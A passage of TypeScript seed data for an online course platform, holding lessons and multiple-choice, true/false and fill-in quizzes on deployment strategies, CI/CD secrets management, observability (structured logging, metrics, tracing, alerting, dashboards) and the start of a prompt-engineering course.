running in production) and *releasing* a feature (turning it on for users). You can deploy on Tuesday and flip the flag on Friday, no redeploy needed, and instantly turn it back off if something's wrong.\n\n> [!TIP]\n> These strategies aren't mutually exclusive, a very common real setup is: canary + feature flags together, deploy the new version to a small percentage of infrastructure (canary), with the risky new behavior additionally behind a flag that's off by default, two independent safety nets instead of one.`
    ),
    quiz: {
      title: 'Deployment Strategies Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In a blue-green deployment, what happens if something's wrong with the new (green) version after switching?",
          options: [
            'You must redeploy from scratch',
            'You switch traffic straight back to blue instantly',
            'The whole app goes down',
            'You wait 24 hours for it to fix itself',
          ],
          answer: 'You switch traffic straight back to blue instantly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A canary deployment sends all traffic to the new version immediately.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ flag wraps new code in a runtime toggle, decoupling deploying code from releasing a feature to users.',
          options: [],
          answer: 'feature',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main cost of a blue-green deployment strategy?',
          options: [
            "It's slower than rolling deployments",
            'You need double the infrastructure running during the switch',
            'It cannot be automated',
            'It requires downtime',
          ],
          answer: 'You need double the infrastructure running during the switch',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'With feature flags, you can deploy code to production while keeping it turned off for real users.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ deployment sends a small percentage of real traffic to the new version before gradually increasing it.',
          options: [],
          answer: 'canary',
        },
      ],
    },
  },
  {
    title: 'Secrets and Environment Management in Pipelines',
    content: lessonContent(
      'Secrets and Environment Management in Pipelines',
      `A pipeline that builds and deploys your app almost always needs credentials, registry logins, cloud provider access, database passwords. Handling these safely is one of the most consequential parts of CI/CD to get right.\n\n## Repository/organization secrets\n\nCI platforms provide an encrypted secrets store separate from your code, referenced in workflows without ever appearing in the YAML or logs:\n\n\`\`\`yaml\nsteps:\n  - name: Deploy\n    env:\n      AWS_ACCESS_KEY_ID: \${{ secrets.AWS_ACCESS_KEY_ID }}\n      AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET_ACCESS_KEY }}\n    run: ./deploy.sh\n\`\`\`\n\nGitHub Actions automatically **redacts** any value matching a registered secret from logs, if a step accidentally echoes \`$AWS_SECRET_ACCESS_KEY\`, the log shows \`***\` instead of the real value.\n\n## Least-privilege deploy credentials\n\nThe credentials your pipeline uses to deploy should follow the same rule as everything else: only what's needed. A pipeline deploying a static site to one S3 bucket doesn't need account-wide admin access, give it a role/user scoped to exactly that bucket (and nothing else), the same IAM principle from the AWS course, applied to your CI system's credentials specifically.\n\n## Environment-specific configuration\n\nDifferent environments (staging, production) usually need different config: different database URLs, different feature flag defaults, different API keys. GitHub Actions **Environments** let you scope secrets and required approvals per environment:\n\n\`\`\`yaml\njobs:\n  deploy-production:\n    environment: production\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh\n\`\`\`\n\nAn \`environment: production\` job can require manual approval before running, and only has access to secrets scoped to that environment, \`staging\` secrets and \`production\` secrets never mix, even within the same repository.\n\n## OIDC: no long-lived secrets at all\n\nThe most modern approach skips storing cloud credentials as secrets entirely: **OIDC (OpenID Connect)** lets your CI platform request short-lived, auto-expiring credentials directly from your cloud provider for each run, nothing long-lived to leak in the first place.\n\n> [!WARNING]\n> A leaked CI secret is one of the most common ways real production incidents start, because CI credentials are often broader than they need to be ("just give it admin, it's easier"). Treat pipeline credentials with the exact same least-privilege scrutiny you'd apply to a human's access.`
    ),
    quiz: {
      title: 'Pipeline Secrets Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does GitHub Actions do if a step's output accidentally contains a registered secret's value?",
          options: [
            'It crashes the workflow',
            'It redacts the value in logs, showing *** instead',
            'It emails the repository owner',
            'Nothing, it prints the value in plain text',
          ],
          answer: 'It redacts the value in logs, showing *** instead',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A pipeline's deploy credentials should have broad, account-wide access to make deployment simpler.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'GitHub Actions ____ let you scope secrets and require manual approval per deployment target like staging or production.',
          options: [],
          answer: 'Environments',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does OIDC let a CI platform do?',
          options: [
            'Store secrets in plain text',
            'Request short-lived, auto-expiring credentials from a cloud provider for each run',
            'Skip running tests',
            'Bypass IAM entirely',
          ],
          answer: 'Request short-lived, auto-expiring credentials from a cloud provider for each run',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Staging and production secrets scoped to different GitHub Actions Environments are automatically kept separate, even in the same repository.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A leaked CI ____ is one of the most common ways real production security incidents start.',
          options: [],
          answer: 'secret',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Full CI/CD Pipeline for a Sample App',
    content: lessonContent(
      'Final Project: Build a Full CI/CD Pipeline for a Sample App',
      `Bring every piece together into one real, working pipeline for a small application of your choice.\n\n## Requirements\n\n1. Set up a GitHub Actions workflow that runs on every push and pull request: install dependencies, lint, and run the test suite, failing fast if any step fails.\n2. Cache dependencies so repeated runs are meaningfully faster than a cold run.\n3. Build a Docker image of your app in the pipeline and tag it with the commit SHA.\n4. Add a separate deploy job that only runs after the test job succeeds (\`needs:\`), deploying your image somewhere real (a container registry at minimum, a running service if you want to go further).\n5. Use at least one repository secret for a credential your pipeline needs, never hardcoded in the workflow file.\n\n## Stretch goals\n\n- Add a test matrix running your suite against two different runtime versions.\n- Use a GitHub Actions Environment with a required manual approval step before deploying to "production".\n- Add a simple feature flag to your app, and deploy a new feature behind it, turned off by default.\n\nSubmit a link to your finished project (a repo with your workflow file, and a note on what it actually deploys to) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const observabilityLessons: SeedLesson[] = [
  {
    title: 'The Three Pillars: Logs, Metrics, and Traces',
    content: lessonContent(
      'The Three Pillars: Logs, Metrics, and Traces',
      `**Observability** is the ability to understand what's happening inside a running system just from what it exposes externally, without having to guess or attach a debugger to production. It's usually broken down into three complementary signal types.\n\n## Monitoring vs. observability\n\n**Monitoring** answers questions you already thought to ask ahead of time ("is CPU usage above 80%?"). **Observability** is what lets you answer questions you *didn't* anticipate when something goes wrong at 3am ("why are only requests from mobile clients in the EU slow, and only since 20 minutes ago?"), by exploring the raw signals your system emits.\n\n## The three pillars\n\n| Pillar | Answers | Example |\n|---|---|---|\n| **Logs** | What happened, in detail, at a specific point | "User 42's payment failed: card declined" |\n| **Metrics** | How much/how many, over time | "Requests per second", "p99 latency" |\n| **Traces** | How a single request flowed through multiple services | "Request hit API → auth service (12ms) → database (340ms) → response" |\n\nNone of the three replaces the others, metrics tell you *something* is wrong and roughly when, logs tell you the specific detail of what happened, traces tell you *where* in a multi-service request the time actually went.\n\n## A concrete example\n\nImagine checkout latency suddenly spikes:\n1. A **metric** (p99 latency dashboard) shows the spike started at 14:32 and is ongoing.\n2. A **trace** for a slow request shows 90% of the time is spent in a call to the inventory service.\n3. **Logs** from the inventory service around that time show repeated database connection timeout errors.\n\nEach pillar narrowed the investigation, from "something is slow" to "which service" to "the exact underlying error", in minutes instead of hours of guessing.\n\n> [!NOTE]\n> This course focuses on the concepts and vendor-agnostic tools (structured logging, Prometheus-style metrics, OpenTelemetry), the same ideas apply whether you're using a cloud provider's built-in tools, a self-hosted stack, or a dedicated observability vendor.`
    ),
    quiz: {
      title: 'Observability Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the key difference between monitoring and observability?",
          options: [
            'They are exactly the same thing',
            'Monitoring answers pre-defined questions, observability lets you explore unanticipated questions',
            'Observability only works for Kubernetes',
            'Monitoring is newer than observability',
          ],
          answer: 'Monitoring answers pre-defined questions, observability lets you explore unanticipated questions',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which pillar tells you how a single request flowed through multiple services?',
          options: ['Logs', 'Metrics', 'Traces', 'Alerts'],
          answer: 'Traces',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Metrics can tell you the specific detailed reason a single request failed.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The pillar that answers 'how much/how many, over time' is ____.",
          options: [],
          answer: 'Metrics',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The three pillars of observability are redundant with each other, so you only need one.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In the checkout latency example, what narrowed the investigation from 'something is slow' to the exact root cause?",
          options: [
            'Guessing randomly',
            'Using metrics, then a trace, then logs together',
            'Restarting the service repeatedly',
            'Ignoring the issue until it resolved itself',
          ],
          answer: 'Using metrics, then a trace, then logs together',
        },
      ],
    },
  },
  {
    title: 'Structured Logging Done Right',
    content: lessonContent(
      'Structured Logging Done Right',
      `A log line like \`Payment failed for user\` is easy for a human to read once, and nearly useless to search, filter, or aggregate across millions of log lines. **Structured logging** fixes that by emitting logs as data, not prose.\n\n## Plain text vs. structured\n\n\`\`\`\n# Plain text\nPayment failed for user 42, card declined, order #8817\n\n# Structured (JSON)\n{"level": "error", "event": "payment_failed", "userId": 42, "orderId": 8817, "reason": "card_declined", "timestamp": "2026-07-08T14:32:01Z"}\n\`\`\`\n\nThe structured version is trivial to query ("show me every \`payment_failed\` event where \`reason = card_declined\` in the last hour"), the plain-text version requires fragile regex or full-text search across free-form sentences that might not even be phrased consistently between developers.\n\n## Log levels\n\nEvery log line should carry a **level**, indicating urgency and who needs to see it:\n\n| Level | Meaning |\n|---|---|\n| \`debug\` | Detailed diagnostic info, useful in development, usually off in production |\n| \`info\` | Normal operational events (a request completed, a job started) |\n| \`warn\` | Something unexpected, but not (yet) a failure |\n| \`error\` | An operation failed |\n\nBeing disciplined about levels means production can run at \`info\` and above by default, keeping log volume (and cost) manageable, while \`debug\` is available to flip on temporarily when actively investigating something.\n\n## Correlation IDs\n\nA single user action often triggers work across multiple services, correlating all their logs together requires a shared identifier attached to every log line involved in handling that one request:\n\n\`\`\`\n{"event": "request_received", "correlationId": "req-9f8a", "path": "/checkout"}\n{"event": "payment_charged", "correlationId": "req-9f8a", "amount": 4999}\n{"event": "order_created", "correlationId": "req-9f8a", "orderId": 8817}\n\`\`\`\n\nGenerate a \`correlationId\` (or reuse the incoming one if the request came from another internal service) at the very start of handling a request, and pass it along to every downstream call and every log line for that request.\n\n> [!TIP]\n> If you can't answer "show me every log line related to this one specific user's specific failed request" in under a minute, your logging isn't structured enough yet, that query is the entire point of doing this.`
    ),
    quiz: {
      title: 'Structured Logging Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the main advantage of structured (JSON) logs over free-form text?",
          options: [
            'They take up less disk space always',
            'They are trivial to query and filter reliably',
            'They cannot be read by humans at all',
            'They replace the need for metrics',
          ],
          answer: 'They are trivial to query and filter reliably',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ ID is a shared identifier attached to every log line involved in handling one specific request, letting you trace it across services.',
          options: [],
          answer: 'correlation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In production, it's common to run at info level and above by default, keeping debug logs available to enable temporarily.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which log level indicates an operation actually failed?',
          options: ['debug', 'info', 'warn', 'error'],
          answer: 'error',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Structured logging replaces the need for log levels entirely.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Being able to find every log line related to one specific failed request quickly is the whole point of ____ logging.',
          options: [],
          answer: 'structured',
        },
      ],
    },
  },
  {
    title: 'Metrics and Time-Series Data',
    content: lessonContent(
      'Metrics and Time-Series Data',
      `Logs tell you about individual events. **Metrics** aggregate numbers over time, letting you see trends, set alerts, and build dashboards without drowning in individual log lines.\n\n## The three basic metric types\n\n| Type | Behavior | Example |\n|---|---|---|\n| **Counter** | Only ever goes up (until reset) | Total requests served |\n| **Gauge** | Goes up or down freely | Current memory usage, active connections |\n| **Histogram** | Buckets observations to compute distributions | Request latency (so you can ask for p50/p95/p99) |\n\nA counter for \`http_requests_total\` doesn't tell you the request *rate*, but a monitoring system can compute the rate of change over time from a raw counter, which is usually what you actually want to graph.\n\n## Prometheus-style metrics\n\nA very common pattern (used by Prometheus and compatible with most modern monitoring stacks) is exposing metrics as plain text on an HTTP endpoint that a collector periodically scrapes:\n\n\`\`\`\n# HELP http_requests_total Total HTTP requests\n# TYPE http_requests_total counter\nhttp_requests_total{method="GET",status="200"} 84213\nhttp_requests_total{method="GET",status="500"} 12\n\n# HELP http_request_duration_seconds Request latency\n# TYPE http_request_duration_seconds histogram\nhttp_request_duration_seconds_bucket{le="0.1"} 79000\nhttp_request_duration_seconds_bucket{le="0.5"} 83900\nhttp_request_duration_seconds_bucket{le="+Inf"} 84225\n\`\`\`\n\nThe \`{method="GET",status="200"}\` part is a set of **labels**, letting you slice the same metric by dimensions (which method, which status code) without defining a separate metric name for every combination.\n\n## The cardinality trap\n\nLabels are powerful, but each unique combination of label values creates a separate time series stored and tracked individually. Adding a label like \`userId\` to a metric with millions of users creates millions of time series, this is called a **cardinality explosion**, and it can silently overwhelm a monitoring system's storage and query performance.\n\n> [!WARNING]\n> Never put unbounded, high-cardinality values (user IDs, email addresses, raw URLs with query strings, request IDs) directly into a metric's labels. Those belong in logs and traces instead, metric labels should stay to a bounded, relatively small set of values (a handful of environments, a handful of status codes, a handful of regions).`
    ),
    quiz: {
      title: 'Metrics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metric type only ever increases (until it resets)?',
          options: ['Gauge', 'Counter', 'Histogram', 'Trace'],
          answer: 'Counter',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metric type lets you compute percentiles like p95 latency?',
          options: ['Counter', 'Gauge', 'Histogram', 'Log level'],
          answer: 'Histogram',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A gauge metric can go both up and down, like current memory usage.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A set of key-value pairs attached to a metric, like method and status, letting you slice it by dimension, is called a ____.',
          options: [],
          answer: 'label',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Adding a high-cardinality label like userId to a metric is a safe, recommended practice.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Adding unbounded label values that create millions of separate time series is called a cardinality ____.',
          options: [],
          answer: 'explosion',
        },
      ],
    },
  },
  {
    title: 'Distributed Tracing',
    content: lessonContent(
      'Distributed Tracing',
      `A single user request in a microservices system might touch five, ten, or more services before a response comes back. When it's slow, "logs from each service" don't easily show you the full, connected picture, **distributed tracing** does.\n\n## Traces, spans, and context propagation\n\nA **trace** represents one end-to-end request, made up of multiple **spans**, each span is one unit of work (a single service call, a database query) with a start time, duration, and metadata.\n\n\`\`\`\nTrace: checkout-req-9f8a\n├── span: API gateway            (2ms)\n├── span: auth service check     (12ms)\n├── span: inventory service call (340ms)  ← the slow one\n│   └── span: inventory DB query (335ms)\n└── span: payment service call   (45ms)\n\`\`\`\n\nEach span records its **parent span**, building the tree above, so a tracing tool can render exactly where time was spent across the whole request, at a glance.\n\n## Propagating context across services\n\nFor this to work, a **trace context** (trace ID + current span ID) has to travel with the request as it hops between services, usually via an HTTP header:\n\n\`\`\`\ntraceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01\n\`\`\`\n\nEvery service in the chain reads the incoming trace context, creates its own span as a child of it, and passes the updated context along to whatever it calls next. Miss this step in even one service, and the trace breaks into two disconnected pieces there.\n\n## OpenTelemetry\n\n**OpenTelemetry (OTel)** is the current industry-standard, vendor-neutral way to instrument code for traces (and logs and metrics), instrument your code once with OTel's libraries, and send the data to whichever backend you choose (many are compatible), instead of locking your instrumentation to one specific vendor's proprietary SDK.\n\n\`\`\`\nimport { trace } from '@opentelemetry/api';\n\nconst tracer = trace.getTracer('inventory-service');\n\nasync function checkStock(itemId) {\n  return tracer.startActiveSpan('checkStock', async (span) => {\n    const result = await db.query(...);\n    span.end();\n    return result;\n  });\n}\n\`\`\`\n\n> [!NOTE]\n> A great deal of tracing's value comes for free once a service framework or library has built-in OTel instrumentation, HTTP frameworks, database clients, and message queues increasingly ship this out of the box, so you often get spans for the "boring" infrastructure calls without writing any tracing code yourself, and only add manual spans for the business logic you specifically want visibility into.`
    ),
    quiz: {
      title: 'Distributed Tracing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a span?',
          options: ['An entire trace', 'One unit of work within a trace, like a single service call', 'A type of log level', 'A metric label'],
          answer: 'One unit of work within a trace, like a single service call',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Trace context must travel with a request across service boundaries (e.g. via an HTTP header) for a trace to stay connected.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'If a service fails to propagate the incoming trace context to what it calls next, the trace ____ into disconnected pieces.',
          options: [],
          answer: 'breaks',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is OpenTelemetry?',
          options: [
            "A single vendor's proprietary monitoring product",
            'A vendor-neutral standard for instrumenting traces, logs, and metrics',
            'A database engine',
            'A container orchestrator',
          ],
          answer: 'A vendor-neutral standard for instrumenting traces, logs, and metrics',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Each span records its parent span, which is how a tracing tool reconstructs the full request tree.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Many HTTP frameworks and database clients now ship built-in ____ instrumentation, giving you spans for infrastructure calls with no extra code.',
          options: [],
          answer: 'OTel',
        },
      ],
    },
  },
  {
    title: 'Alerting Without Burning Out Your Team',
    content: lessonContent(
      'Alerting Without Burning Out Your Team',
      `Collecting logs, metrics, and traces is only useful if the right person finds out at the right time when something's actually wrong, without being paged for things that don't matter. Alerting is where observability turns into action.\n\n## SLIs, SLOs, and error budgets\n\n- **SLI (Service Level Indicator)**: a specific measurement, e.g. "percentage of requests completed successfully" or "p99 latency".\n- **SLO (Service Level Objective)**: a target for that indicator, e.g. "99.9% of requests succeed over a rolling 30 days".\n- **Error budget**: the amount of "failure" the SLO allows, 99.9% success means a 0.1% error budget, once you're consistently spending it faster than planned, that's a signal to slow down new releases and focus on stability instead of features.\n\n## Alert on symptoms, not causes\n\nA common mistake: alerting on every possible underlying cause ("CPU > 90%", "one Pod restarted", "disk usage > 80%") instead of on user-visible symptoms ("error rate > 1%", "p99 latency > 2s"). A single real incident can trigger dozens of cause-based alerts simultaneously, symptom-based alerts fire once, for the thing that actually matters to users.\n\n\`\`\`\n❌ Alert: "CPU usage above 90% on node-7"\n✅ Alert: "Error rate above 1% for checkout service, sustained 5 minutes"\n\`\`\`\n\n## Actionable alerts only\n\nEvery alert that pages a human should be something they can actually **act on**. If an alert fires and the response is always "check it, it's fine, go back to sleep", that's not an alert, that's noise, and it trains people to ignore the next one, including the real one.\n\n- Does this alert mean something is currently broken for users, or might be soon?\n- Is there a clear next action for whoever receives it?\n- Would ignoring this alert for an hour actually cause harm?\n\nIf the answer to any of these is "no", it probably shouldn't page anyone, it might still be worth a metric on a dashboard, just not a 3am notification.\n\n> [!WARNING]\n> **Alert fatigue** (too many low-value alerts) is one of the most common ways real incidents get missed, not because nobody was watching, but because everyone had learned to tune out the constant noise. A team with 5 alerts they trust completely responds faster than a team with 50 they've learned to dismiss.`
    ),
    quiz: {
      title: 'Alerting Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is an SLO?',
          options: [
            'A type of log format',
            'A target for a specific service level indicator, like 99.9% success rate',
            'A metric label',
            'A distributed tracing tool',
          ],
          answer: 'A target for a specific service level indicator, like 99.9% success rate',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The amount of allowed failure under an SLO (e.g. 0.1% for a 99.9% target) is called the error ____.',
          options: [],
          answer: 'budget',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Alerting on user-visible symptoms (like error rate) is generally preferred over alerting on every possible underlying cause.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is 'alert fatigue'?",
          options: [
            'A hardware failure',
            'When too many low-value alerts train people to ignore alerts, including real ones',
            'A type of distributed trace',
            'A billing charge from too many alerts',
          ],
          answer: 'When too many low-value alerts train people to ignore alerts, including real ones',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Every alert that fires should always page a human immediately, regardless of whether there's a clear next action.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Service Level ____ is a specific measurement, like percentage of successful requests or p99 latency.',
          options: [],
          answer: 'Indicator',
        },
      ],
    },
  },
  {
    title: 'Dashboards and Centralized Log Aggregation',
    content: lessonContent(
      'Dashboards and Centralized Log Aggregation',
      `With logs, metrics, and traces flowing from every service, you need somewhere to actually collect, search, and visualize all of it, especially once you have more than one service or more than one server.\n\n## Why centralize logs\n\nIf every service's logs only live on its own machine/container, investigating anything that spans services (which is most real incidents) means SSHing into multiple machines and manually correlating timestamps, painfully slow, and impossible once containers get recycled and their local logs disappear with them.\n\nA **log aggregation** pipeline ships logs from every service to one central, searchable place:\n\n\`\`\`\nService A logs ─┐\nService B logs ─┼──→  Log shipper  →  Central storage/index  →  Search UI\nService C logs ─┘\n\`\`\`\n\nCommon building blocks: **Fluentd**/**Fluent Bit** or **Logstash** as the shipper, **Elasticsearch** or a similar index as storage, **Kibana** or **Grafana** as the search/visualization UI, this combination (Elasticsearch + Logstash + Kibana) is common enough to have its own acronym, the "ELK stack".\n\n## Building a useful dashboard\n\nA good dashboard answers "is everything okay right now?" at a glance, and helps narrow down "what's wrong?" within seconds if not. A solid starting point for almost any service:\n\n- **Request rate** (traffic volume over time)\n- **Error rate** (percentage of failed requests)\n- **Latency** (p50 and p99, not just an average, which hides outliers)\n- **Saturation** (how close a resource, CPU/memory/queue depth, is to its limit)\n\nThis is sometimes called the **"four golden signals"** (from Google's SRE book), covering both "are users having a bad time" (rate/errors/latency) and "are we about to have a bad time" (saturation).\n\n## Correlating across pillars in one place\n\nThe real payoff of centralizing everything: from one dashboard, you can jump from a metric spike, to the traces active during that window, to the specific logs from the exact service and time range the trace pointed at, without re-typing timestamps or switching between five different tools' worth of context.\n\n> [!TIP]\n> Don't build a dashboard with 40 panels nobody looks at. Start with the four golden signals for your most important service, and only add more once you've actually needed something else while debugging a real incident.`
    ),
    quiz: {
      title: 'Dashboards & Log Aggregation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the ELK stack stand for?',
          options: ['Elasticsearch, Logstash, Kibana', 'Events, Logs, Kubernetes', 'Error, Latency, Kafka', 'Encryption, Logging, Kubernetes'],
          answer: 'Elasticsearch, Logstash, Kibana',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Investigating an incident by SSHing into each service's machine individually is a scalable, recommended approach for a multi-service system.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The 'four golden signals' from Google's SRE book are latency, traffic, errors, and ____.",
          options: [],
          answer: 'saturation',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should latency be shown as p50/p99 rather than just an average?',
          options: [
            'Averages are illegal in monitoring',
            'An average hides outliers that percentiles reveal',
            'p99 is easier to compute',
            'Averages cannot be graphed',
          ],
          answer: 'An average hides outliers that percentiles reveal',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A good dashboard should have as many panels as possible to show every available metric.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Central log storage lets you jump from a metric spike to related traces to the exact ____ from that time range, all in one place.',
          options: [],
          answer: 'logs',
        },
      ],
    },
  },
  {
    title: 'Final Project: Instrument a Sample App with Logs, Metrics, and Traces',
    content: lessonContent(
      'Final Project: Instrument a Sample App with Logs, Metrics, and Traces',
      `Apply all three pillars to a real, running application, however small.\n\n## Requirements\n\n1. Add structured (JSON) logging to your app, including at least one correlation ID that's attached to every log line generated while handling a single request.\n2. Expose at least three Prometheus-style metrics: one counter (e.g. total requests), one gauge (e.g. active connections), and one histogram (e.g. request latency), on a scrapeable endpoint.\n3. Add basic distributed tracing (using OpenTelemetry or a similar library) around at least one operation that calls another service or the database, with the trace context propagated if your app has more than one service.\n4. Build a simple dashboard (even a basic Grafana/hosted-tool dashboard, or a written mockup with real numbers) showing the four golden signals for your app.\n5. Define at least one SLO for your app (e.g. "99% of requests complete in under 500ms") and describe what alert you'd configure to catch a violation of it.\n\n## Stretch goals\n\n- Deliberately introduce a bug, then use only your logs/metrics/traces (not the source code) to diagnose it, and write up how you found it.\n- Add a second alert rule based on error rate, and explain why it's a symptom-based alert rather than a cause-based one.\n- Correlate a single request end-to-end: capture its correlation ID, find its trace, and find its logs, all for the exact same request.\n\nSubmit a link to your finished project (a repo, or a written report with dashboard screenshots/mock numbers) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const promptEngineeringLessons: SeedLesson[] = [
  {
    title: 'What Is Prompt Engineering (and Vibe Coding)?',
    content: lessonContent(
      'What Is Prompt Engineering (and Vibe Coding)?',
      `AI coding assistants (like Claude Code, GitHub Copilot, and ChatGPT) can now write, edit, and even run code from natural-language instructions. Two terms have emerged to describe working with them.\n\n## Prompt engineering\n\nThe practice of writing instructions that reliably get an AI model to produce the output you actually want. It's less about "magic words" and more about being clear, specific, and giving the right context, the same skill you'd use writing a good ticket for a human teammate.\n\n## Vibe coding\n\nA newer, more informal term for a style of development where you describe *what* you want in plain language and let an AI agent write (and often run) the code, iterating conversationally instead of typing every line yourself. It can be incredibly fast, but it shifts your job from *writing* code to *directing and reviewing* code.\n\n## The spectrum\n\n| | Autocomplete | Prompted generation | Vibe coding |\n|---|---|---|---|\n| You write | Every line, AI suggests completions | A prompt, AI writes a function or file | A goal, AI plans and executes multi-step changes |\n| You review | Character by character as you type | The generated snippet | The whole diff, tests, and behavior |\n| Best for | Familiar, fast-moving code | Well-scoped, isolated tasks | Larger features, paired with careful review |\n\n> [!NOTE]\n> None of this changes who's responsible for the code that ships. Whether you typed it or an AI did, you still own the bugs, the security holes, and the technical debt. This course is about using these tools well, not blindly.`
    ),
    quiz: {
      title: 'Prompt Engineering Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is "vibe coding"?',
          options: [
            'Writing code without using any AI tools',
            'Describing a goal in plain language and letting an AI agent write and run the code',
            'A formal certification for developers',
            'A type of syntax highlighting theme',
          ],
          answer: 'Describing a goal in plain language and letting an AI agent write and run the code',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prompt ____ is the practice of writing instructions that reliably get an AI model to produce the output you want.',
          options: [],
          answer: 'engineering',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Using an AI assistant to write code means you're no longer responsible for bugs it introduces.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Writing Clear, Specific Prompts',
    content: lessonContent(
      'Writing Clear, Specific Prompts',
      `A vague prompt gets a vague, or wrong, result. The single biggest lever you have over an AI's output is how clearly you describe the task.\n\n## Vague vs. specific\n\n\`\`\`\n❌ "Fix the login bug"\n\n✅ "Users can't log in with an uppercase email address. The login\nroute at apps/api/src/routes/auth.ts compares email exactly instead\nof case-insensitively. Make the comparison case-insensitive without\nchanging how emails are stored."\n\`\`\`\n\nThe second prompt tells the AI **what's broken**, **where**, **why**, and **what not to change**, four things a vague one-liner leaves it to guess.\n\n## A simple checklist\n\n- **Goal**, what should be true when you're done?\n- **Location**, which file(s), function(s), or area of the app?\n- **Constraints**, what should stay the same? Anything to avoid?\n- **Examples**, a sample input/output, or a similar pattern already in the codebase, if one exists.\n\n## Iterate, don't restart\n\nIf the first result isn't quite right, you rarely need to throw it away and start over. Point at exactly what's wrong:\n\n\`\`\`\n"Close, but this also matches emails that are subsets of each other,\nlike 'a@b.com' matching 'aa@b.com'. Only treat them as equal if they\nmatch exactly, ignoring case."\n\`\`\`\n\n> [!TIP]\n> Treat your prompt like a well-written bug report or a ticket for a new teammate, if it would confuse a human collaborator, it'll confuse the AI too.`
    ),
    quiz: {
      title: 'Clear Prompts Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is most likely to produce a good result from an AI coding assistant?',
          options: [
            'A single vague sentence',
            'A prompt describing the goal, location, and constraints',
            'Repeating the exact same short prompt several times',
            'Avoiding any mention of file names',
          ],
          answer: 'A prompt describing the goal, location, and constraints',
        },
        {
          type: 'FILL_BLANK',
          prompt: "When a result isn't quite right, it's usually more effective to describe exactly what's wrong than to ____ from scratch.",
          options: [],
          answer: 'restart',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Providing an example of the desired input/output typically improves an AI's response.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Giving AI the Right Context',
